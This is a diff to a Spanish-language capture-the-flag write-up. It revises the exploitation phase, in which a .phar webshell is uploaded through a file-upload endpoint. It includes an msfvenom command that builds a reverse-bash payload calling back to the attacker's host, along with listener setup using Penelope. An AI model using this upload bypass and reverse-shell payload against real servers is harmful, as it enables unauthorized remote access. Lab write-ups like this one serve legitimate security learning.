@@ -44,21 +44,24 @@ ___
 
 #### FASE EXPLOTACIÓN (Ganar Acesso):  
 
-Una vez Enumerados todos los Servicios, debemos lograr acceso. Después de mucho investigar, pareciera que Vector para conseguirlo es intentar subir una **WebShell** de alguna manera. Probamos subir simples archivos (JPGs, PNGs, PHPs, TXTs, etc.) en `/file_upload.php` y después de varios intentos, nada. Entonces, pasamos a descargar los recursos PHP que son los que tienen la lógica para dicha función. Lo hacemos de la siguiente manera:  
+Una vez enumerados todos los servicios, debemos lograr entrar. Después de mucho investigar, pareciera que el *Vector* es una **WebShell**. Probamos subir archivos con extensiones comunes (JPG, PNG, PHP, TXT, etc.) en el endpoint `/file_upload.php`. Después de varios intentos, nada.  
+
+Entonces, pasamos a descargar los recursos PHP que son los que tienen la lógica de la subida. Lo hacemos de la siguiente manera:  
 
 * `curl -O http://<IP>/file_upload.php`
 * `curl -O http://<IP>/subir_archivo.php`
 
-Revisándolos localmente con `cat` o `less`, vemos que no dice nada relevante en cuanto al formato de archivo aceptado. Entonces, finalmente, intentamos con archivos `.phar` y tenemos éxito.  
+Revisándolos localmente con `cat` o `less`, vemos que no dice nada relevante en cuanto al formato de archivo aceptado. Entonces, finalmente, intentamos con la extensión `.phar` y tenemos éxito.  
 
-> Los archivos PHAR son como empaquetados de PHP que pueden tener código ejecutable, entre otras cosas. Por lo cual, es una manera alternativa para correr una WebShell.
+> Los archivos PHAR son como empaquetados de PHP que pueden tener código ejecutable, entre otras cosas. Por lo cual, es una manera alternativa para correr una WebShell.  
 
-Ahora, teniendo en cuenta esto, pasamos a crear dicha webshell con `msfvemom`:  
+Ahora, teniendo en cuenta esto, pasamos a crearla con `msfvemom`:  
 
 `msfvenom -p php/unix/cmd/reverse_bash LHOST=<IP_local> LPORT=<puerto_local> R -o webshell.php.phar`  
 
-> La R es equivalente a `-f raw`  
+> La `R` es equivalente a `-f raw` que significa *Código en Crudo*  
 > Usamos el payload anterior para poder recibir la conexión reversa con alguna otra herramienta alternativa a Meterpreter, para variar.
+> Aquí suponemos que el usuario www-data usa el intérprete de bash (y lo hace), pero de no funcionar, buscaríamos otro.  
 
 Bien, una vez creada, procedemos a subirla. Tenemos éxito y nos dirigimos a `/uploads` donde verificamos la misma. Ahora, pasamos a preparar nuestro listener. En este caso, usamos [Penélope](https://github.com/brightio/penelope). Con `penelope -i <IP_local> -p <puerto>` creamos nuestro listener. Corremos y ejecutamos la webshell en el navegador. Tenemos acceso.  
 
